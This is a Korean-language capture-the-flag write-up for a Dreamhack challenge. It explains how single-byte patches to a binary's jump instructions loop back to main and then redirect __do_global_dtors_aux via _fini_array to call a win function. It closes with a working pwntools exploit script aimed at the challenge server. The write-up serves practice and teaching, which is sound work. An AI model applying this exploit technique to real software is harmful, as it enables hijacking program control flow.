처음엔 1바이트만 바꿔서 `win` 함수를 부를 수 있을지 생각해봤다. 좀 고민한 끝에 안 된다는 것을 깨달았다.
그럼 1바이트만 바꿔서 `main` 함수를 계속 부를 수 있어야 한다.
`jz      short locret_132A`
이용해주면 된다. 항상 참이므로 뛰는 값만 조절하면 `main` 함수 초반으로 돌아갈 수 있어서 원하는 만큼 조작이 가능하다.

그 후는 다양한 방법으로 `win` 함수를 부를 수 있는데, 나는 `_fini_array`에 있는 `__do_global_dtors_aux` 함수를 사용하였다.
`jnz     short locret_11D8`
여기서 `jnz`를 `jz`로 바꾸고 뛰는 값을 조절한 뒤, `main`  무한 반복을 풀어주면 `win` 함수를 호출할 수 있다.

브포로 딱 1바이트만 바꿔서 성공하신 분 제외하고는 익스 코드가 짧은 편에 속하는 것 같다.
# exploit.py

```python
from pwn import *
from time import *

p = remote('host1.dreamhack.games', 14712)
#p = process('./prob')

p.sendlineafter(b': ', str(0x324).encode())
p.sendlineafter(b': ', str((0x2b3 - 0x325) & 0xff).encode())

sleep(1)
p.sendline(str(0x1ab).encode())
p.sendlineafter(b': ', str(0x74).encode())

sleep(1)
p.sendline(str(0x1ac).encode())
p.sendlineafter(b': ', str(0xed - 0xab - 2).encode())

sleep(1)
p.sendline(str(0x324).encode())
p.sendlineafter(b': ', str(0x5).encode())
p.interactive()
```